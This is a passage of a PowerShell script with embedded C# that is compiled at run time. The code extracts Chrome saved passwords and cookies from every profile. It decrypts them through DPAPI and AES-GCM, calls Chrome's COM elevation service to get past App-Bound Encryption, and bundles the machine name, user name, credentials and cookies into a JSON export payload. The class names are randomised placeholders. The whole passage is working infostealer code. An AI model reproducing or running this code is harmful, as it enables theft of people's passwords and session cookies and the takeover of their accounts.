        foreach (string profilePath in Directory.GetDirectories(chromePath))
        {
            string folder = Path.GetFileName(profilePath);
            if (!ProfileFolderRegex.IsMatch(folder))
            {
                continue;
            }

            string loginDbPath = Path.Combine(profilePath, "Login Data");
            if (File.Exists(loginDbPath))
            {
                byte[] dbBytes = TryReadShared(loginDbPath);
                if (dbBytes != null)
                {
                    foreach (PasswordEntry entry in ReadLogins(dbBytes, folder, dpapiKey, attemptDpapiDecrypt, ref index))
                    {
                        passwords.Add(entry);
                    }
                }
            }

            if (attemptDpapiDecrypt)
            {
                string cookiesDbPath = ResolveCookiesDbPath(profilePath);
                if (cookiesDbPath != null)
                {
                    byte[] cookieDbBytes = TryReadShared(cookiesDbPath);
                    if (cookieDbBytes != null)
                    {
                        foreach (CookieEntry entry in ReadCookies(cookieDbBytes, folder, dpapiKey, attemptDpapiDecrypt, ref cookieIndex))
                        {
                            cookies.Add(entry);
                        }
                    }
                }
            }
        }

        return BuildJson(passwords, cookies, payloadUsername);
    }

    public static string MergeExportPayload(
        string exportJson,
        string chromeJson,
        string profilesJson,
        string chromelevatorJson,
        string chromelevatorChromeRoot)
    {
        var serializer = new JavaScriptSerializer
        {
            MaxJsonLength = int.MaxValue,
            RecursionLimit = 1024
        };

        var data = serializer.DeserializeObject(exportJson) as Dictionary<string, object>;
        if (data == null)
        {
            throw new InvalidOperationException("3002");
        }

        OverlayJsonField(serializer, data, "chrome", chromeJson);
        OverlayJsonField(serializer, data, "profiles", profilesJson);
        OverlayJsonField(serializer, data, "chromelevator", chromelevatorJson);

        if (!string.IsNullOrEmpty(chromelevatorChromeRoot) && Directory.Exists(chromelevatorChromeRoot))
        {
            MergeChromelevatorPasswordsIntoExport(serializer, data, chromelevatorChromeRoot);
            ArrayList cookies = BuildChromelevatorCookies(serializer, chromelevatorChromeRoot);
            if (cookies.Count > 0)
            {
                data["cookies"] = cookies;
                data["cookieCount"] = cookies.Count;
            }
        }

        string result = serializer.Serialize(data);
        if (string.IsNullOrEmpty(result) || result == "null" || result.Length < 100)
        {
            throw new InvalidOperationException("3002");
        }

        return result;
    }

    private static void OverlayJsonField(
        JavaScriptSerializer serializer,
        Dictionary<string, object> data,
        string field,
        string json)
    {
        if (string.IsNullOrWhiteSpace(json))
        {
            return;
        }

        data[field] = serializer.DeserializeObject(json);
    }

    private static string GetJsonString(Dictionary<string, object> entry, params string[] keys)
    {
        foreach (string key in keys)
        {
            if (entry.ContainsKey(key) && entry[key] != null)
            {
                return Convert.ToString(entry[key]) ?? "";
            }
        }

        return "";
    }

    private static IEnumerable<object> CoerceJsonArray(object parsed)
    {
        if (parsed == null)
        {
            yield break;
        }

        var arrayList = parsed as ArrayList;
        if (arrayList != null)
        {
            foreach (object item in arrayList)
            {
                yield return item;
            }
            yield break;
        }

        var objectArray = parsed as object[];
        if (objectArray != null)
        {
            foreach (object item in objectArray)
            {
                yield return item;
            }
            yield break;
        }

        var enumerable = parsed as IEnumerable;
        if (enumerable != null && !(parsed is string))
        {
            foreach (object item in enumerable)
            {
                yield return item;
            }
            yield break;
        }

        yield return parsed;
    }

    private static Dictionary<string, object> CoerceJsonDictionary(object item)
    {
        var dict = item as Dictionary<string, object>;
        if (dict != null)
        {
            return dict;
        }

        var idict = item as IDictionary;
        if (idict == null)
        {
            return null;
        }

        var result = new Dictionary<string, object>();
        foreach (DictionaryEntry entry in idict)
        {
            result[Convert.ToString(entry.Key)] = entry.Value;
        }

        return result;
    }

    private static string NormalizePasswordKey(string profile, string url, string username)
    {
        string normalizedUrl = string.IsNullOrEmpty(url) ? "" : url.TrimEnd('/').ToLowerInvariant();
        string normalizedUser = string.IsNullOrEmpty(username) ? "" : username.ToLowerInvariant();
        return (profile ?? "") + "|" + normalizedUrl + "|" + normalizedUser;
    }

    private static void MergeChromelevatorPasswordsIntoExport(
        JavaScriptSerializer serializer,
        Dictionary<string, object> data,
        string chromeRoot)
    {
        var abeMap = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        foreach (string passwordsFile in Directory.GetFiles(chromeRoot, "passwords.json", SearchOption.AllDirectories))
        {
            string profileName = Path.GetFileName(Path.GetDirectoryName(passwordsFile));
            object parsed = serializer.DeserializeObject(File.ReadAllText(passwordsFile, Encoding.UTF8));

            foreach (object item in CoerceJsonArray(parsed))
            {
                var entry = CoerceJsonDictionary(item);
                if (entry == null || !entry.ContainsKey("pass") || entry["pass"] == null)
                {
                    continue;
                }

                string pass = Convert.ToString(entry["pass"]);
                if (string.IsNullOrEmpty(pass))
                {
                    continue;
                }

                string url = GetJsonString(entry, "url");
                string user = GetJsonString(entry, "user", "username");
                abeMap[NormalizePasswordKey(profileName, url, user)] = pass;
            }
        }

        object passwordData = data.ContainsKey("passwords") ? data["passwords"] : null;
        if (passwordData == null)
        {
            return;
        }

        foreach (object item in CoerceJsonArray(passwordData))
        {
            var entry = item as Dictionary<string, object>;
            if (entry == null)
            {
                continue;
            }

            string profile = GetJsonString(entry, "profile");
            string url = GetJsonString(entry, "url");
            string username = GetJsonString(entry, "username", "user");
            string key = NormalizePasswordKey(profile, url, username);
            string decrypted;
            if (!abeMap.TryGetValue(key, out decrypted) || string.IsNullOrEmpty(decrypted))
            {
                continue;
            }

            entry["password_dpapi"] = decrypted;
        }
    }

    private static ArrayList BuildChromelevatorCookies(JavaScriptSerializer serializer, string chromeRoot)
    {
        var cookies = new ArrayList();
        int index = 0;

        foreach (string cookiesFile in Directory.GetFiles(chromeRoot, "cookies.json", SearchOption.AllDirectories))
        {
            string profileName = Path.GetFileName(Path.GetDirectoryName(cookiesFile));
            object parsed = serializer.DeserializeObject(File.ReadAllText(cookiesFile, Encoding.UTF8));

            foreach (object item in CoerceJsonArray(parsed))
            {
                var entry = CoerceJsonDictionary(item);
                if (entry == null)
                {
                    continue;
                }

                string value = GetJsonString(entry, "value", "pass");
                var cookie = new Dictionary<string, object>();
                cookie["index"] = index++;
                cookie["profile"] = profileName;
                cookie["host"] = GetJsonString(entry, "host", "domain");
                cookie["name"] = GetJsonString(entry, "name");
                cookie["path"] = GetJsonString(entry, "path");
                cookie["value"] = value;
                cookie["value_dpapi"] = value;

                long expires = 0;
                if (entry.ContainsKey("expires") && entry["expires"] != null)
                {
                    try
                    {
                        expires = Convert.ToInt64(entry["expires"]);
                    }
                    catch
                    {
                        expires = 0;
                    }
                }

                cookie["expires"] = expires;

                if (entry.ContainsKey("secure") && entry["secure"] != null)
                {
                    try
                    {
                        cookie["secure"] = Convert.ToBoolean(entry["secure"]);
                    }
                    catch
                    {
                    }
                }

                if (entry.ContainsKey("httpOnly") && entry["httpOnly"] != null)
                {
                    try
                    {
                        cookie["httpOnly"] = Convert.ToBoolean(entry["httpOnly"]);
                    }
                    catch
                    {
                    }
                }

                cookies.Add(cookie);
            }
        }

        return cookies;
    }

    private static string ResolveCookiesDbPath(string profilePath)
    {
        string networkPath = Path.Combine(profilePath, "Network", "Cookies");
        if (File.Exists(networkPath))
        {
            return networkPath;
        }

        string legacyPath = Path.Combine(profilePath, "Cookies");
        if (File.Exists(legacyPath))
        {
            return legacyPath;
        }

        return null;
    }

    private static byte[] GetEncryptedKeyBlob(string localStatePath, string keyName)
    {
        string json = File.ReadAllText(localStatePath, Encoding.UTF8);
        string marker = "\"" + keyName + "\":\"";
        int start = json.IndexOf(marker, StringComparison.Ordinal);
        if (start < 0)
        {
            return null;
        }

        start += marker.Length;
        int end = json.IndexOf('"', start);
        if (end < 0)
        {
            return null;
        }

        byte[] data = Convert.FromBase64String(json.Substring(start, end - start));
        if (data.Length <= 4)
        {
            return null;
        }

        byte[] payload = new byte[data.Length - 4];
        Array.Copy(data, 4, payload, 0, payload.Length);
        return payload;
    }

    private static byte[] ReadShared(string path)
    {
        using (var stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
        {
            var bytes = new byte[stream.Length];
            int read = 0;
            while (read < bytes.Length)
            {
                read += stream.Read(bytes, read, bytes.Length - read);
            }
            return bytes;
        }
    }

    private static byte[] TryReadShared(string path)
    {
        try
        {
            return ReadShared(path);
        }
        catch (IOException)
        {
            return null;
        }
        catch (UnauthorizedAccessException)
        {
            return null;
        }
    }

    private static byte[] GetSecretKey(string localStatePath)
    {
        string json = File.ReadAllText(localStatePath, Encoding.UTF8);
        string marker = "\"encrypted_key\":\"";
        int start = json.IndexOf(marker, StringComparison.Ordinal);
        if (start < 0)
        {
            return null;
        }

        start += marker.Length;
        int end = json.IndexOf('"', start);
        if (end < 0)
        {
            return null;
        }

        byte[] secretKey = Convert.FromBase64String(json.Substring(start, end - start));
        byte[] keyPayload = new byte[secretKey.Length - 5];
        Array.Copy(secretKey, 5, keyPayload, 0, keyPayload.Length);
        return ProtectedData.Unprotect(keyPayload, null, DataProtectionScope.CurrentUser);
    }

    private static IEnumerable<PasswordEntry> ReadLogins(byte[] dbBytes, string profile, byte[] dpapiKey, bool attemptDpapiDecrypt, ref int index)
    {
        var entries = new List<PasswordEntry>();
        IntPtr db = IntPtr.Zero;
        IntPtr stmt = IntPtr.Zero;
        GCHandle pinned = GCHandle.Alloc(dbBytes, GCHandleType.Pinned);

        try
        {
            int rc = sqlite3_open(":memory:", out db);
            if (rc != 0)
            {
                throw new InvalidOperationException("1003");
            }

            IntPtr dataPtr = pinned.AddrOfPinnedObject();
            rc = sqlite3_deserialize(db, "main", dataPtr, dbBytes.LongLength, dbBytes.LongLength, SQLITE_DESERIALIZE_READONLY);
            if (rc != 0)
            {
                throw new InvalidOperationException("1004");
            }

            rc = sqlite3_prepare_v2(db, "SELECT action_url, origin_url, username_value, password_value FROM logins", -1, out stmt, IntPtr.Zero);
            if (rc != 0)
            {
                throw new InvalidOperationException("1005");
            }

            while (sqlite3_step(stmt) == 100)
            {
                string actionUrl = ReadText(stmt, 0);
                string originUrl = ReadText(stmt, 1);
                string url = !string.IsNullOrEmpty(actionUrl) ? actionUrl : originUrl;
                string username = ReadText(stmt, 2);
                byte[] ciphertext = ReadBlob(stmt, 3);

                string password = "";
                string passwordDpapi = "";

                if (ciphertext != null && ciphertext.Length > 0)
                {
                    if (attemptDpapiDecrypt)
                    {
                        try
                        {
                            password = __CRYPTO_CLASS__.DecryptPassword(dpapiKey, ciphertext, false);
                        }
                        catch
                        {
                            password = "";
                        }
                    }
                    else if (ciphertext.Length >= 3)
                    {
                        string version = Encoding.ASCII.GetString(ciphertext, 0, 3);
                        if (version == "v20")
                        {
                            password = "[Chrome 127+ App-Bound Encryption - export from chrome://password-manager]";
                        }
                    }
                }

                entries.Add(new PasswordEntry
                {
                    Index = index,
                    Profile = profile,
                    Url = url,
                    Username = username,
                    Password = password,
                    PasswordDpapi = passwordDpapi
                });
                index++;
            }
        }
        finally
        {
            if (stmt != IntPtr.Zero)
            {
                sqlite3_finalize(stmt);
            }
            if (db != IntPtr.Zero)
            {
                sqlite3_close_v2(db);
            }
            if (pinned.IsAllocated)
            {
                pinned.Free();
            }
        }

        return entries;
    }

    private static IEnumerable<CookieEntry> ReadCookies(byte[] dbBytes, string profile, byte[] dpapiKey, bool attemptDpapiDecrypt, ref int index)
    {
        var entries = new List<CookieEntry>();
        IntPtr db = IntPtr.Zero;
        IntPtr stmt = IntPtr.Zero;
        GCHandle pinned = GCHandle.Alloc(dbBytes, GCHandleType.Pinned);

        try
        {
            int rc = sqlite3_open(":memory:", out db);
            if (rc != 0)
            {
                throw new InvalidOperationException("1006");
            }

            IntPtr dataPtr = pinned.AddrOfPinnedObject();
            rc = sqlite3_deserialize(db, "main", dataPtr, dbBytes.LongLength, dbBytes.LongLength, SQLITE_DESERIALIZE_READONLY);
            if (rc != 0)
            {
                throw new InvalidOperationException("1007");
            }

            rc = sqlite3_prepare_v2(
                db,
                "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies",
                -1,
                out stmt,
                IntPtr.Zero);
            if (rc != 0)
            {
                throw new InvalidOperationException("1008");
            }

            while (sqlite3_step(stmt) == 100)
            {
                string host = ReadText(stmt, 0);
                string name = ReadText(stmt, 1);
                string cookiePath = ReadText(stmt, 2);
                byte[] ciphertext = ReadBlob(stmt, 3);
                long expires = ReadInt64(stmt, 4);
                bool secure = ReadInt(stmt, 5) != 0;
                bool httpOnly = ReadInt(stmt, 6) != 0;

                string value = "";
                string valueDpapi = "";

                if (ciphertext != null && ciphertext.Length > 0)
                {
                    if (attemptDpapiDecrypt)
                    {
                        try
                        {
                            value = __CRYPTO_CLASS__.DecryptPassword(dpapiKey, ciphertext, false);
                        }
                        catch
                        {
                            value = "";
                        }
                    }
                    else if (ciphertext.Length >= 3)
                    {
                        string version = Encoding.ASCII.GetString(ciphertext, 0, 3);
                        if (version == "v20")
                        {
                            value = "[Chrome 127+ App-Bound Encryption - export from chrome://password-manager]";
                        }
                    }
                }

                entries.Add(new CookieEntry
                {
                    Index = index,
                    Profile = profile,
                    Host = host,
                    Name = name,
                    Path = cookiePath,
                    Value = value,
                    ValueDpapi = valueDpapi,
                    Expires = expires,
                    Secure = secure,
                    HttpOnly = httpOnly
                });
                index++;
            }
        }
        finally
        {
            if (stmt != IntPtr.Zero)
            {
                sqlite3_finalize(stmt);
            }
            if (db != IntPtr.Zero)
            {
                sqlite3_close_v2(db);
            }
            if (pinned.IsAllocated)
            {
                pinned.Free();
            }
        }

        return entries;
    }

    private static long ReadInt64(IntPtr stmt, int column)
    {
        return sqlite3_column_int64(stmt, column);
    }

    private static int ReadInt(IntPtr stmt, int column)
    {
        return sqlite3_column_int(stmt, column);
    }

    private static string ReadText(IntPtr stmt, int column)
    {
        IntPtr ptr = sqlite3_column_text(stmt, column);
        return ptr == IntPtr.Zero ? "" : Marshal.PtrToStringAnsi(ptr);
    }

    private static byte[] ReadBlob(IntPtr stmt, int column)
    {
        int length = sqlite3_column_bytes(stmt, column);
        if (length <= 0)
        {
            return null;
        }

        IntPtr ptr = sqlite3_column_blob(stmt, column);
        if (ptr == IntPtr.Zero)
        {
            return null;
        }

        var bytes = new byte[length];
        Marshal.Copy(ptr, bytes, 0, length);
        return bytes;
    }

    private static string BuildJson(List<PasswordEntry> passwords, List<CookieEntry> cookies, string payloadUsername)
    {
        string username = string.IsNullOrWhiteSpace(payloadUsername)
            ? Environment.UserName
            : payloadUsername.Trim();
        var builder = new StringBuilder();
        builder.Append("{");
        builder.Append("\"hostname\":").Append(JsonString(Environment.MachineName)).Append(",");
        builder.Append("\"username\":").Append(JsonString(username)).Append(",");
        builder.Append("\"executedAt\":").Append(JsonString(DateTime.UtcNow.ToString("o"))).Append(",");
        builder.Append("\"passwordCount\":").Append(passwords.Count).Append(",");
        builder.Append("\"cookieCount\":").Append(cookies.Count).Append(",");
        builder.Append("\"passwords\":");
        AppendPasswordArray(builder, passwords);
        builder.Append(",\"cookies\":");
        AppendCookieArray(builder, cookies);
        builder.Append("}");
        return builder.ToString();
    }

    private static void AppendPasswordArray(StringBuilder builder, List<PasswordEntry> passwords)
    {
        builder.Append("[");

        for (int i = 0; i < passwords.Count; i++)
        {
            PasswordEntry entry = passwords[i];
            if (i > 0)
            {
                builder.Append(",");
            }

            AppendPasswordEntry(builder, entry);
        }

        builder.Append("]");
    }

    private static void AppendPasswordEntry(StringBuilder builder, PasswordEntry entry)
    {
        builder.Append("{");
        builder.Append("\"index\":").Append(entry.Index).Append(",");
        builder.Append("\"profile\":").Append(JsonString(entry.Profile)).Append(",");
        builder.Append("\"url\":").Append(JsonString(entry.Url)).Append(",");
        builder.Append("\"username\":").Append(JsonString(entry.Username)).Append(",");
        builder.Append("\"password\":").Append(JsonString(entry.Password)).Append(",");
        builder.Append("\"password_dpapi\":").Append(JsonString(entry.PasswordDpapi));
        builder.Append("}");
    }

    private static void AppendCookieArray(StringBuilder builder, List<CookieEntry> cookies)
    {
        builder.Append("[");

        for (int i = 0; i < cookies.Count; i++)
        {
            CookieEntry entry = cookies[i];
            if (i > 0)
            {
                builder.Append(",");
            }

            AppendCookieEntry(builder, entry);
        }

        builder.Append("]");
    }

    private static void AppendCookieEntry(StringBuilder builder, CookieEntry entry)
    {
        builder.Append("{");
        builder.Append("\"index\":").Append(entry.Index).Append(",");
        builder.Append("\"profile\":").Append(JsonString(entry.Profile)).Append(",");
        builder.Append("\"host\":").Append(JsonString(entry.Host)).Append(",");
        builder.Append("\"name\":").Append(JsonString(entry.Name)).Append(",");
        builder.Append("\"path\":").Append(JsonString(entry.Path)).Append(",");
        builder.Append("\"value\":").Append(JsonString(entry.Value)).Append(",");
        builder.Append("\"value_dpapi\":").Append(JsonString(entry.ValueDpapi)).Append(",");
        builder.Append("\"expires\":").Append(entry.Expires).Append(",");
        builder.Append("\"secure\":").Append(entry.Secure ? "true" : "false").Append(",");
        builder.Append("\"httpOnly\":").Append(entry.HttpOnly ? "true" : "false");
        builder.Append("}");
    }

    private static string JsonString(string value)
    {
        if (value == null)
        {
            return "null";
        }

        var builder = new StringBuilder(value.Length + 2);
        builder.Append('"');
        foreach (char ch in value)
        {
            switch (ch)
            {
                case '\\': builder.Append("\\\\"); break;
                case '"': builder.Append("\\\""); break;
                case '\b': builder.Append("\\b"); break;
                case '\f': builder.Append("\\f"); break;
                case '\n': builder.Append("\\n"); break;
                case '\r': builder.Append("\\r"); break;
                case '\t': builder.Append("\\t"); break;
                default:
                    if (ch < 32)
                    {
                        builder.Append("\\u");
                        builder.Append(((int)ch).ToString("x4"));
                    }
                    else
                    {
                        builder.Append(ch);
                    }
                    break;
            }
        }
        builder.Append('"');
        return builder.ToString();
    }

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_open(string filename, out IntPtr db);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_deserialize(IntPtr db, string schema, IntPtr data, long szDb, long szBuf, int flags);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_prepare_v2(IntPtr db, string sql, int nByte, out IntPtr stmt, IntPtr tail);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_step(IntPtr stmt);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_column_text(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_column_blob(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_column_bytes(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_column_int(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern long sqlite3_column_int64(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_finalize(IntPtr stmt);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_close_v2(IntPtr db);

    private sealed class PasswordEntry
    {
        public int Index;
        public string Profile;
        public string Url;
        public string Username;
        public string Password;
        public string PasswordDpapi;
    }

    private sealed class CookieEntry
    {
        public int Index;
        public string Profile;
        public string Host;
        public string Name;
        public string Path;
        public string Value;
        public string ValueDpapi;
        public long Expires;
        public bool Secure;
        public bool HttpOnly;
    }
}

public static class __COM_ELEVATOR_CLASS__
{
    private const uint CLSCTX_LOCAL_SERVER = 0x4;
    private const uint RPC_C_AUTHN_DEFAULT = 0xFFFFFFFF;
    private const uint RPC_C_AUTHZ_DEFAULT = 0xFFFFFFFF;
    private const uint RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
    private const uint RPC_C_IMP_LEVEL_IMPERSONATE = 3;
    private const uint EOAC_DYNAMIC_CLOAKING = 0x40;
    private const int COINIT_APARTMENTTHREADED = 0x2;
    private const int S_OK = 0;
    private const int S_FALSE = 1;
    private const int RPC_E_CHANGED_MODE = unchecked((int)0x80010106);
    private const int E_NOINTERFACE = unchecked((int)0x80004002);

    private static readonly Guid ChromeClsid = new Guid("708860E0-F641-4611-8895-7D867DD3675B");
    private static readonly Guid ChromeElevatorIid = new Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8");
    private static readonly Guid ChromeElevator2Iid = new Guid("1BF5208B-295F-4992-B5F4-3A9BB6494838");

    [ComImport]
    [Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IElevatorChrome
    {
        [PreserveSig]
        int RunRecoveryCRXElevated(
            [MarshalAs(UnmanagedType.LPWStr)] string crxPath,
            [MarshalAs(UnmanagedType.LPWStr)] string filePath,
            [MarshalAs(UnmanagedType.LPWStr)] string browserInstallPath,
            [MarshalAs(UnmanagedType.LPWStr)] string browserVersion,
            uint browserFlags,
            out IntPtr result);

        [PreserveSig]
        int EncryptData(
            int protectionLevel,
            IntPtr plaintext,
            out IntPtr ciphertext,
            out uint lastError);

        [PreserveSig]
        int DecryptData(
            IntPtr ciphertext,
            out IntPtr plaintext,
            out uint lastError);
    }

    [DllImport("ole32.dll")]
    private static extern int CoInitializeEx(IntPtr reserved, int coinit);

    [DllImport("ole32.dll")]
    private static extern void CoUninitialize();

    [DllImport("ole32.dll")]
    private static extern int CoCreateInstance(
        ref Guid clsid,
        IntPtr pUnkOuter,
        uint dwClsContext,
        ref Guid iid,
        out IntPtr ppv);

    [DllImport("ole32.dll")]
    private static extern int CoSetProxyBlanket(
        IntPtr pProxy,
        uint dwAuthnSvc,
        uint dwAuthzSvc,
        IntPtr pServerPrincName,
        uint dwAuthnLevel,
        uint dwImpLevel,
        IntPtr pAuthInfo,
        uint dwCapabilities);

    [DllImport("oleaut32.dll")]
    private static extern IntPtr SysAllocStringByteLen(byte[] str, uint len);

    [DllImport("oleaut32.dll")]
    private static extern void SysFreeString(IntPtr bstr);

    [DllImport("oleaut32.dll")]
    private static extern uint SysStringByteLen(IntPtr bstr);

    public static byte[] DecryptAppBoundKey(byte[] encryptedPayload, out string error)
    {
        error = null;
        bool comInitialized = false;
        IntPtr elevatorPtr = IntPtr.Zero;
        IntPtr bstrEnc = IntPtr.Zero;
        IntPtr bstrPlain = IntPtr.Zero;

        try
        {
            int hr = CoInitializeEx(IntPtr.Zero, COINIT_APARTMENTTHREADED);
            if (hr != S_OK && hr != S_FALSE && hr != RPC_E_CHANGED_MODE)
            {
                error = "1013";
                return null;
            }

            comInitialized = true;

            Guid clsid = ChromeClsid;
            Guid iid = ChromeElevator2Iid;
            hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref iid, out elevatorPtr);
            if (hr == E_NOINTERFACE)
            {
                iid = ChromeElevatorIid;
                hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref iid, out elevatorPtr);
            }

            if (hr != S_OK || elevatorPtr == IntPtr.Zero)
            {
                error = "1014";
                return null;
            }

            hr = CoSetProxyBlanket(
                elevatorPtr,
                RPC_C_AUTHN_DEFAULT,
                RPC_C_AUTHZ_DEFAULT,
                IntPtr.Zero,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                IntPtr.Zero,
                EOAC_DYNAMIC_CLOAKING);

            if (hr != S_OK)
            {
                error = "1015";
                return null;
            }

            IElevatorChrome elevator = (IElevatorChrome)Marshal.GetObjectForIUnknown(elevatorPtr);
            bstrEnc = SysAllocStringByteLen(encryptedPayload, (uint)encryptedPayload.Length);
            if (bstrEnc == IntPtr.Zero)
            {
                error = "1016";
                return null;
            }

            uint comErr;
            hr = elevator.DecryptData(bstrEnc, out bstrPlain, out comErr);
            if (hr != S_OK || bstrPlain == IntPtr.Zero)
            {
                error = "1017";
                return null;
            }

            uint len = SysStringByteLen(bstrPlain);
            var key = new byte[len];
            Marshal.Copy(bstrPlain, key, 0, (int)len);
            return key;
        }
        catch (Exception)
        {
            error = "1018";
            return null;
        }
        finally
        {
            if (bstrEnc != IntPtr.Zero) SysFreeString(bstrEnc);
            if (bstrPlain != IntPtr.Zero) SysFreeString(bstrPlain);
            if (elevatorPtr != IntPtr.Zero) Marshal.Release(elevatorPtr);
            if (comInitialized) CoUninitialize();
        }
    }
}

public static class __CRYPTO_CLASS__
{
    [StructLayout(LayoutKind.Sequential)]
    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }

    [DllImport("bcrypt.dll")]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);

    public static string DecryptPassword(byte[] secretKey, byte[] ciphertext, bool allowV20 = false)
    {
        if (ciphertext == null || ciphertext.Length < 31)
        {
            return "";
        }

        string version = Encoding.ASCII.GetString(ciphertext, 0, 3);
        if (version == "v20" && !allowV20)
        {
            return "[Chrome 127+ App-Bound Encryption - export from chrome://password-manager]";
        }

        if (version != "v10" && version != "v11" && version != "v20")
        {
            return "";
        }

        byte[] nonce = new byte[12];
        Array.Copy(ciphertext, 3, nonce, 0, 12);

        byte[] encryptedPassword = new byte[ciphertext.Length - 31];
        Array.Copy(ciphertext, 15, encryptedPassword, 0, encryptedPassword.Length);

        byte[] tag = new byte[16];
        Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16);

        byte[] plaintext = DecryptAesGcm(secretKey, nonce, encryptedPassword, tag);
        return Encoding.UTF8.GetString(plaintext);
    }

    private static byte[] DecryptAesGcm(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        IntPtr hAlgorithm = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        IntPtr noncePtr = IntPtr.Zero;
        IntPtr tagPtr = IntPtr.Zero;

        try
        {
            int status = BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0);
            if (status != 0) throw new InvalidOperationException("1009");

            byte[] chainMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            status = BCryptSetProperty(hAlgorithm, "ChainingMode", chainMode, chainMode.Length, 0);
            if (status != 0) throw new InvalidOperationException("1010");

            status = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (status != 0) throw new InvalidOperationException("1011");

            noncePtr = Marshal.AllocHGlobal(nonce.Length);
            Marshal.Copy(nonce, 0, noncePtr, nonce.Length);
            tagPtr = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, tagPtr, tag.Length);

            var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            authInfo.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
            authInfo.dwInfoVersion = 1;
            authInfo.pbNonce = noncePtr;
            authInfo.cbNonce = nonce.Length;
            authInfo.pbTag = tagPtr;
            authInfo.cbTag = tag.Length;

            byte[] plaintext = new byte[ciphertext.Length];
            int bytesWritten;
            status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref authInfo, null, 0, plaintext, plaintext.Length, out bytesWritten, 0);
            if (status != 0) throw new InvalidOperationException("1012");

            if (bytesWritten != plaintext.Length)
            {
                Array.Resize(ref plaintext, bytesWritten);
            }

            return plaintext;
        }
        finally
        {
            if (noncePtr != IntPtr.Zero) Marshal.FreeHGlobal(noncePtr);
            if (tagPtr != IntPtr.Zero) Marshal.FreeHGlobal(tagPtr);
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlgorithm != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        }
    }
}
"@
$typeDefinition = $typeDefinition.Replace("__EXPORTER_CLASS__", $ChromeExporterClassName)
$typeDefinition = $typeDefinition.Replace("__COM_ELEVATOR_CLASS__", $ChromeComElevatorClassName)
$typeDefinition = $typeDefinition.Replace("__CRYPTO_CLASS__", $ChromeCryptoClassName)

Add-Type -ReferencedAssemblies System.Security,System.Web.Extensions -TypeDefinition $typeDefinition

Write-DebugStep "Add-Type completed"

$exporterType = [AppDomain]::CurrentDomain.GetAssemblies() |
    ForEach-Object { $_.GetType($ChromeExporterClassName) } |
    Where-Object { $_ } |
    Select-Object -First 1

if (-not $exporterType) {
    throw [System.InvalidOperationException]::new("Exporter type not found after Add-Type")
}

